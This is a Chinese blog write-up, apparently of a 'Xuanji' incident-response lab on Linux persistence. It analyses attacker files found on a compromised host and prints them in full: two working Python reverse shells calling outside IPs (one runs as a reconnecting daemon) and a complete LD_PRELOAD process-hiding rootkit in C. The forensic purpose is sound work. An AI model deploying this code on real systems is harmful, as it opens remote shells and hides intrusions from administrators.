@@ -4878,4 +4878,202 @@
         <tag>文件上传</tag>
       </tags>
   </entry>
+  <entry>
+    <title>玄机第三章权限维持</title>
+    <url>/2024/11/22/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%89%E7%AB%A0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
+    <content><![CDATA[<h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>第三章在计划中，继续学习</p>
+<h1 id="0x02正文"><a href="#0x02正文" class="headerlink" title="0x02正文"></a>0x02正文</h1><h2 id="什么是linux权限维持"><a href="#什么是linux权限维持" class="headerlink" title="什么是linux权限维持?"></a>什么是linux权限维持?</h2><p>首先在 Linux 系统上，权限维持是黑客攻击过程中的一个重要环节。攻击者成功获得系统权限后，会采取各种手段来保持对系统的访问控制，防止被发现并移除。这些手段可以分为多种，包括隐藏进程、文件、网络连接等。</p>
+<h2 id="一些常见的-Linux-权限维持和隐藏方法："><a href="#一些常见的-Linux-权限维持和隐藏方法：" class="headerlink" title="一些常见的 Linux 权限维持和隐藏方法："></a>一些常见的 Linux 权限维持和隐藏方法：</h2><h4 id="后门程序"><a href="#后门程序" class="headerlink" title="后门程序"></a>后门程序</h4><p>后门程序（Backdoor）是一种恶意软件或程序，允许攻击者绕过正常的身份验证或安全措施，以便在系统中获得未经授权的访问权限。后门程序可以被攻击者使用来在目标计算机上实现持久的控制，通常在攻击者已经成功入侵系统后安装。</p>
+<ul>
+<li>后门程序的特点</li>
+</ul>
+<ol>
+<li><strong>隐藏性</strong>：后门程序通常设计得非常隐蔽，以避免被用户或安全软件发现。它们可能伪装成合法程序或系统服务。</li>
+<li><strong>绕过安全控制</strong>：后门程序使攻击者能够不通过正常的登录过程进入系统，从而绕过身份验证机制。</li>
+<li><strong>远程访问</strong>：后门程序通常允许攻击者从远程位置控制被感染的系统。攻击者可以通过网络连接与后门通信，执行命令、窃取数据或进一步传播恶意软件。</li>
+<li><strong>持久性</strong>：许多后门程序会在系统中实现持久性，即使系统重启也能重新激活。这可以通过修改启动项、服务或利用计划任务等方式实现。</li>
+</ol>
+<p>攻击者通常会在受害系统中安装后门程序，以便在需要时重新获得访问权限。常见的后门程序包括：</p>
+<ul>
+<li><p>SSH 后门：创建一个新的用户，配置 SSH 公钥认证，避免密码登录被检测到。</p>
+</li>
+<li><p>反弹 Shell：通过反弹 Shell 连接到攻击者的机器，获取远程控制权限。</p>
+</li>
+<li><p>Web Shell：通过 Web Shell（如 PHP 代码嵌入）远程控制 Web 服务器。</p>
+</li>
+</ul>
+<h4 id="Rootkit"><a href="#Rootkit" class="headerlink" title="Rootkit"></a>Rootkit</h4><p>Rootkit 是一种能够隐藏自身及其他恶意程序的工具。安装 Rootkit 后，攻击者可以隐藏进程、文件和网络连接，防止被系统管理员发现。</p>
+<ul>
+<li><p>内核级 Rootkit：直接修改内核数据结构和函数，隐藏进程、文件和网络连接。</p>
+</li>
+<li><p>用户级 Rootkit：通过劫持系统库函数（如 ld_preload），隐藏特定进程和文件。</p>
+</li>
+</ul>
+<h4 id="持久化机制"><a href="#持久化机制" class="headerlink" title="持久化机制"></a>持久化机制</h4><p>攻击者会使用各种持久化机制，以确保即使系统重启后也能重新获得控制权限。</p>
+<ul>
+<li><p>修改启动脚本：在系统启动脚本中加入恶意代码，保证每次系统启动时都会执行。</p>
+</li>
+<li><p>crontab 定时任务：在 crontab 中添加恶意任务，定期执行恶意程序。</p>
+</li>
+</ul>
+<h4 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h4><p>攻击者会将恶意文件和工具隐藏在系统中，以防被发现。</p>
+<ul>
+<li><p>文件名伪装：将恶意文件命名为类似系统文件的名称，如 syslogd、sshd 等。</p>
+</li>
+<li><p>隐藏目录：使用隐藏目录（如 . 开头的目录），将恶意文件放置其中。</p>
+</li>
+</ul>
+<h4 id="网络连接隐藏"><a href="#网络连接隐藏" class="headerlink" title="网络连接隐藏"></a>网络连接隐藏</h4><p>攻击者可能会隐藏与其控制服务器的网络连接，以防被网络管理员发现。</p>
+<ul>
+<li><p>端口重定向：使用工具（如 iptables）重定向流量到特定端口，隐藏实际通信端口。</p>
+</li>
+<li><p>加密通信：使用加密协议（如 SSH、SSL）进行通信，防止流量被检测和分析。</p>
+</li>
+</ul>
+<h4 id="日志清除"><a href="#日志清除" class="headerlink" title="日志清除"></a>日志清除</h4><p>攻击者会清除或篡改系统日志，以隐藏入侵痕迹。</p>
+<ul>
+<li><p>清除命令历史：删除或篡改 .bash_history 文件。</p>
+</li>
+<li><p>修改系统日志：直接修改系统日志文件（如 &#x2F;var&#x2F;log 下的日志），删除入侵痕迹。</p>
+</li>
+</ul>
+<h4 id="使用合法进程"><a href="#使用合法进程" class="headerlink" title="使用合法进程"></a>使用合法进程</h4><p>攻击者会利用合法的系统进程进行恶意活动，以隐藏其行为。</p>
+<ul>
+<li><p>进程注入：将恶意代码注入到合法的系统进程中。</p>
+</li>
+<li><p>利用系统工具：使用系统自带的工具（如 netcat、curl）进行恶意操作。</p>
+</li>
+</ul>
+<p>这些权限维持和隐藏技术使得攻击者能够长时间保持对系统的控制权，同时降低被检测和移除的风险。</p>
+<h2 id="问题1：黑客隐藏的隐藏的文件-完整路径md5"><a href="#问题1：黑客隐藏的隐藏的文件-完整路径md5" class="headerlink" title="问题1：黑客隐藏的隐藏的文件 完整路径md5"></a>问题1：黑客隐藏的隐藏的文件 完整路径md5</h2><p>根据上面的权限维持方法可以知道，隐藏文件的方法有文件名伪装或者隐藏目录和隐藏文件，因为 Unix&#x2F;Linux 系统中，文件名以 <code>.</code> 开头的文件默认是隐藏文件。这些文件不会显示在普通的 <code>ls</code> 命令输出中，除非使用 <code>ls -a</code>。黑客常常利用这种特性，将恶意文件或脚本以 <code>.</code> 开头来隐藏。</p>
+<p><strong>那我们可以直接使用find来进行查找以点开头的隐藏文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name &quot;.*&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%89%E7%AB%A0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20241122145355820.png" alt="image-20241122145355820"></p>
+<p>这里可以看到有很多文件，不过黑客经常会将隐藏文件放在<code>/tmp</code>目录下，因此先去这个目录下找，发现有一个<code>.temp</code>文件</p>
+<p>分析一下这几个tmp目录下的文件</p>
+<ul>
+<li>&#x2F;tmp&#x2F;.temp</li>
+</ul>
+<p>1.首先这个目录以 . 开头，因此是一个隐藏目录。</p>
+<p>2.其次存放在 &#x2F;tmp 目录下，这里通常用于临时文件存储。</p>
+<p>3.最后黑客可能利用 &#x2F;tmp 目录来存放临时的恶意文件，因为 &#x2F;tmp 通常具有读写权限。</p>
+<ul>
+<li>&#x2F;tmp&#x2F;.temp&#x2F;libprocesshider&#x2F;</li>
+</ul>
+<p>1.这个子目录也以 . 开头，属于隐藏目录 &#x2F;tmp&#x2F;.temp。</p>
+<p>2.目录名 libprocesshider 暗示包含用于隐藏进程的库或工具，通常是恶意软件的一部分。</p>
+<ul>
+<li>&#x2F;tmp&#x2F;.temp&#x2F;libprocesshider&#x2F;.git</li>
+</ul>
+<p>1.这是一个隐藏的 .git 目录，表明这个目录可能是一个 Git 仓库。</p>
+<p>2.黑客可能使用 Git 来管理他们的工具或恶意代码。</p>
+<ul>
+<li>&#x2F;tmp&#x2F;.temp&#x2F;libprocesshider&#x2F;.gitignore</li>
+</ul>
+<p>1.这是一个 Git 配置文件，用于指定哪些文件或目录在提交时应被忽略。</p>
+<p>2.这个文件也以 . 开头，是一个隐藏文件。</p>
+<ul>
+<li>为什么它们是隐藏文件</li>
+</ul>
+<p>1.默认隐藏：在 Unix&#x2F;Linux 系统中，以 . 开头的文件和目录默认是隐藏的。这种文件和目录不会在普通的 ls 列表中显示，除非使用 ls -a 命令。<br>2.逃避检测：黑客常常利用隐藏文件和目录来逃避系统管理员或安全工具的检测。把恶意文件放在隐藏目录中可以减少被发现的几率。<br>3.临时性：将文件放在 &#x2F;tmp 目录下表明这些文件可能是临时的。系统重启后，某些 &#x2F;tmp 目录下的文件可能会被删除，从而掩盖黑客的痕迹。</p>
+<p>那我们跟进一下&#x2F;tmp&#x2F;.temp&#x2F;libprocesshider&#x2F;目录进行分析，然后可以看到有一个1.py和shell.py，</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%89%E7%AB%A0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20241122150211106.png" alt="image-20241122150211106"></p>
+<p>跟进一下1.py和shell.py</p>
+<p>1.py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os,sys, time</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;这里导入了必要的模块：</span></span><br><span class="line"><span class="string">socket：用于网络通信。</span></span><br><span class="line"><span class="string">subprocess：用于执行外部命令。</span></span><br><span class="line"><span class="string">os：用于操作系统相关的功能（如进程管理）。</span></span><br><span class="line"><span class="string">sys：用于与Python解释器交互。</span></span><br><span class="line"><span class="string">time：用于时间相关的操作（如休眠）。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#Forking 进程</span></span><br><span class="line">pidrg = os.fork()</span><br><span class="line"><span class="keyword">if</span> pidrg &gt; <span class="number">0</span>:</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#使用 os.fork() 创建一个新进程。父进程的 pidrg 将大于 0，因此它会退出，这样只留下子进程继续执行后续操作。</span></span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">os.setsid()</span><br><span class="line">os.umask(<span class="number">0</span>)</span><br><span class="line">drgpid = os.fork()</span><br><span class="line"><span class="keyword">if</span> drgpid &gt; <span class="number">0</span>:</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">将工作目录更改为根目录 /，这样可以避免对当前目录的引用。</span></span><br><span class="line"><span class="string">使用 os.setsid() 创建一个新会话，使当前进程成为会话的领导者。这是为了确保它不会在终端控制下运行。</span></span><br><span class="line"><span class="string">使用 os.umask(0) 设置文件创建掩码为 0，允许创建的文件权限没有限制。</span></span><br><span class="line"><span class="string">再次进行进程分叉，确保完全脱离终端。父进程会退出，只保留了新的子进程。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                sys.stderr.flush()</span><br><span class="line">                fdreg = <span class="built_in">open</span>(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">                sys.stdout = fdreg</span><br><span class="line">                sys.stderr = fdreg</span><br><span class="line">                <span class="string">&#x27;&#x27;&#x27;进入无限循环，确保该程序持续运行。</span></span><br><span class="line"><span class="string">清空标准输出和标准错误输出。</span></span><br><span class="line"><span class="string">将标准输出和标准错误重定向到 /dev/null，即丢弃所有输出。&#x27;&#x27;&#x27;</span></span><br><span class="line">                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">                sdregs.connect((<span class="string">&quot;114.114.114.121&quot;</span>,<span class="number">9999</span>))</span><br><span class="line">                <span class="comment">#创建一个TCP socket并连接到指定的IP地址（114.114.114.121）和端口（9999）。这就是反向连接的目标。</span></span><br><span class="line">                os.dup2(sdregs.fileno(),<span class="number">0</span>)</span><br><span class="line">                os.dup2(sdregs.fileno(),<span class="number">1</span>)</span><br><span class="line">                os.dup2(sdregs.fileno(),<span class="number">2</span>)</span><br><span class="line">                <span class="comment">#通过 os.dup2() 将标准输入、标准输出和标准错误输出重定向到与攻击者连接的socket。这意味着任何输入、输出和错误信息都将通过网络发送到攻击者的计算机。</span></span><br><span class="line">                p=subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br><span class="line">                sdregs.close()</span><br><span class="line">                <span class="comment">#启动一个交互式的bash shell，这样攻击者就可以通过socket执行命令。</span></span><br><span class="line">                <span class="comment">#关闭socket连接。</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment">#如果在连接过程中出错（如连接失败），捕获异常并等待2秒钟，然后重试。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>这个 Python 脚本文件是一个反弹 shell 程序，具有后台运行的功能。反向Shell是指在被攻击的计算机上打开一个Shell，并通过网络向攻击者的计算机连接，这样攻击者就可以远程执行命令。</strong></p>
+<p>分析一下这个反弹shell的程序，我全部注释在代码里面</p>
+<p><strong>总结</strong></p>
+<p><strong>这个脚本的目的是创建一个反弹 shell 连接，将当前系统的命令行接口通过网络发送到远程服务器 <code>114.114.114.121:9999</code>，并在服务器上执行。这种行为通常被黑客用来远程控制受害者的系统。</strong></p>
+<p>我们再看看shell.py文件</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> dup2</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> run</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;172.16.10.7&quot;</span>,<span class="number">2220</span>))</span><br><span class="line">dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">run([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+<p><strong>简单来说 这个 <code>shell.py</code> 文件也是一个反弹 shell 脚本。它的作用是将当前系统的标准输入、标准输出和标准错误重定向到一个远程服务器的网络连接上，从而允许远程服务器对该系统进行命令控制。</strong></p>
+<p>我们简单分析一下这两个文件的功能和特点</p>
+<p>文件1.py</p>
+<ul>
+<li>功能和特点</li>
+</ul>
+<p>1.双重 Fork 实现进程脱离控制台：</p>
+<ul>
+<li><p>第一次 fork 后父进程退出，使子进程成为孤儿进程，由 init 进程收养。</p>
+</li>
+<li><p>调用 setsid 创建新会话并成为会话组长。</p>
+</li>
+<li><p>第二次 fork 确保进程不是会话组长，从而避免再打开控制终端。</p>
+</li>
+</ul>
+<p>2.无限循环连接反弹：</p>
+<ul>
+<li><p>在无限循环中尝试连接 114.114.114.121 的 9999 端口。</p>
+</li>
+<li><p>成功连接后，将标准输入、输出和错误重定向到该 socket。</p>
+</li>
+<li><p>启动一个 &#x2F;bin&#x2F;bash shell。</p>
+</li>
+</ul>
+<p>3.隐藏自身输出：</p>
+<ul>
+<li>将标准输出和标准错误重定向到 &#x2F;dev&#x2F;null，使其不产生任何输出。</li>
+</ul>
+<p>文件shell.py;</p>
+<ul>
+<li>功能和特点</li>
+</ul>
+<p>1.简单直接的反弹 Shell：</p>
+<ul>
+<li>创建一个 TCP 连接到 172.16.10.7 的 2220 端口。</li>
+<li>将标准输入、输出和错误重定向到该 socket。</li>
+<li>启动一个交互式的 &#x2F;bin&#x2F;sh shell。</li>
+</ul>
+<p>对比和区别</p>
+<ul>
+<li>连接目标和端口不同：</li>
+</ul>
+<p>1.py 连接 114.114.114.121 的 9999 端口。</p>
+<p>shell.py 连接 172.16.10.7 的 2220 端口。</p>
+<ul>
+<li>shell 类型：</li>
+</ul>
+<p>1.py 使用的是 &#x2F;bin&#x2F;bash。</p>
+<p>shell.py 使用的是 &#x2F;bin&#x2F;sh。</p>
+<ul>
+<li>进程处理：</li>
+</ul>
+<p>1.py 通过双重 fork 以及会话控制使进程脱离终端并成为守护进程。</p>
+<p>shell.py 没有进行进程处理，直接运行反弹 shell。</p>
+<ul>
+<li>隐藏输出：</li>
+</ul>
+<p>1.py 将标准输出和标准错误重定向到 &#x2F;dev&#x2F;null，以隐藏运行时的任何输出。</p>
+<p>shell.py 没有执行这一步，输出会直接通过 socket 传输。</p>
+<ul>
+<li>无限重连：</li>
+</ul>
+<p>1.py 在捕获到异常时，通过 time.sleep(2) 进行无限重连。</p>
+<p>shell.py 只在执行时进行一次连接，没有重连机制。</p>
+<ul>
+<li>总的来说；</li>
+</ul>
+<p>这两个脚本都用于反弹 shell，其中 1.py 采用了更复杂的技术来隐藏和持久化，而 shell.py 则是一个简单直接的反弹 shell 实现。它们的共同点是都通过 socket 连接到远程主机并启动一个 shell，允许远程执行命令。区别在于 1.py 更注重隐藏和持续性，而 shell.py 则更加简洁和直接。</p>
+<p>不过单从这两个文件并不能看出哪个是隐藏文件，我们再另外分析一下</p>
+<p>可以看到里面还有一个processhider.c,我们也分析一下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Every process with this name will be excluded</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* process_to_filter = <span class="string">&quot;1.py&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a directory name given a DIR* handle</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">get_dir_name</span><span class="params">(DIR* dirp, <span class="type">char</span>* buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = dirfd(dirp);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> tmp[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(tmp, <span class="keyword">sizeof</span>(tmp), <span class="string">&quot;/proc/self/fd/%d&quot;</span>, fd);</span><br><span class="line">    <span class="type">ssize_t</span> ret = readlink(tmp, buf, size);</span><br><span class="line">    <span class="keyword">if</span>(ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buf[ret] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*get_dir_name 函数通过 dirfd 获取目录文件描述符，并使用 readlink 读取符号链接 /proc/self/fd/ 指向的实际路径。*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a process name given its pid</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">get_process_name</span><span class="params">(<span class="type">char</span>* pid, <span class="type">char</span>* buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strspn</span>(pid, <span class="string">&quot;0123456789&quot;</span>) != <span class="built_in">strlen</span>(pid)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> tmp[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(tmp, <span class="keyword">sizeof</span>(tmp), <span class="string">&quot;/proc/%s/stat&quot;</span>, pid);</span><br><span class="line"> </span><br><span class="line">    FILE* f = fopen(tmp, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fgets(tmp, <span class="keyword">sizeof</span>(tmp), f) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        fclose(f);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(f);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> unused;</span><br><span class="line">    <span class="built_in">sscanf</span>(tmp, <span class="string">&quot;%d (%[^)]s&quot;</span>, &amp;unused, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DECLARE_READDIR(dirent, readdir)                                \</span></span><br><span class="line"><span class="meta">static struct dirent* (*original_##readdir)(DIR*) = NULL;               \</span></span><br><span class="line"><span class="meta">                                                                        \</span></span><br><span class="line"><span class="meta">struct dirent* readdir(DIR *dirp)                                       \</span></span><br><span class="line"><span class="meta">&#123;                                                                       \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span>(original_##readdir == NULL) &#123;                                    \</span></span><br><span class="line"><span class="meta">        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span>(original_##readdir == NULL)                                  \</span></span><br><span class="line"><span class="meta">        &#123;                                                               \</span></span><br><span class="line"><span class="meta">            fprintf(stderr, <span class="string">&quot;Error in dlsym: %s\n&quot;</span>, dlerror());         \</span></span><br><span class="line"><span class="meta">        &#125;                                                               \</span></span><br><span class="line"><span class="meta">    &#125;                                                                   \</span></span><br><span class="line"><span class="meta">                                                                        \</span></span><br><span class="line"><span class="meta">    struct dirent* dir;                                                 \</span></span><br><span class="line"><span class="meta">                                                                        \</span></span><br><span class="line"><span class="meta">    while(1)                                                            \</span></span><br><span class="line"><span class="meta">    &#123;                                                                   \</span></span><br><span class="line"><span class="meta">        dir = original_##readdir(dirp);                                 \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span>(dir) &#123;                                                       \</span></span><br><span class="line"><span class="meta">            char dir_name[256];                                         \</span></span><br><span class="line"><span class="meta">            char process_name[256];                                     \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span>(get_dir_name(dirp, dir_name, sizeof(dir_name)) &amp;&amp;        \</span></span><br><span class="line"><span class="meta">                strcmp(dir_name, <span class="string">&quot;/proc&quot;</span>) == 0 &amp;&amp;                       \</span></span><br><span class="line"><span class="meta">                get_process_name(dir-&gt;d_name, process_name) &amp;&amp;          \</span></span><br><span class="line"><span class="meta">                strcmp(process_name, process_to_filter) == 0) &#123;         \</span></span><br><span class="line"><span class="meta">                continue;                                               \</span></span><br><span class="line"><span class="meta">            &#125;                                                           \</span></span><br><span class="line"><span class="meta">        &#125;                                                               \</span></span><br><span class="line"><span class="meta">        break;                                                          \</span></span><br><span class="line"><span class="meta">    &#125;                                                                   \</span></span><br><span class="line"><span class="meta">    return dir;                                                         \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line">DECLARE_READDIR(dirent64, readdir64);</span><br><span class="line">DECLARE_READDIR(dirent, readdir);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>总的来说</p>
+<p>这个 <code>processhider.c</code> 文件的目的是通过动态链接库拦截 <code>readdir</code> 系统调用，来隐藏特定名称的进程（在这个中是 <code>1.py</code>）的目录项，使其在进程列表中不可见。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* process_to_filter = <span class="string">&quot;1.py&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码指定要隐藏的进程为1.py，所以我们可以确定这个1.py就是黑客想要隐藏的文件了，直接md5加密路径然后提交就行</p>
+<h2 id="问题2-黑客隐藏的文件反弹shell的ip-端口-ip-port"><a href="#问题2-黑客隐藏的文件反弹shell的ip-端口-ip-port" class="headerlink" title="问题2:黑客隐藏的文件反弹shell的ip+端口 {ip:port}"></a>问题2:黑客隐藏的文件反弹shell的ip+端口 {ip:port}</h2><p>这个的话因为上一题已经分析处理1.py就是隐藏文件，在1.py里面就有反弹shell的远程服务器iip和端口，直接交flag就行，没什么好讲的</p>
+<h2 id="问题3-黑客提权所用的命令-完整路径的md5-flag-md5"><a href="#问题3-黑客提权所用的命令-完整路径的md5-flag-md5" class="headerlink" title="问题3:黑客提权所用的命令 完整路径的md5 flag{md5}"></a>问题3:黑客提权所用的命令 完整路径的md5 flag{md5}</h2>]]></content>
+      <categories>
+        <category>玄机第三章权限维持</category>
+      </categories>
+      <tags>
+        <tag>玄机第三章权限维持</tag>
+      </tags>
+  </entry>
 </search>
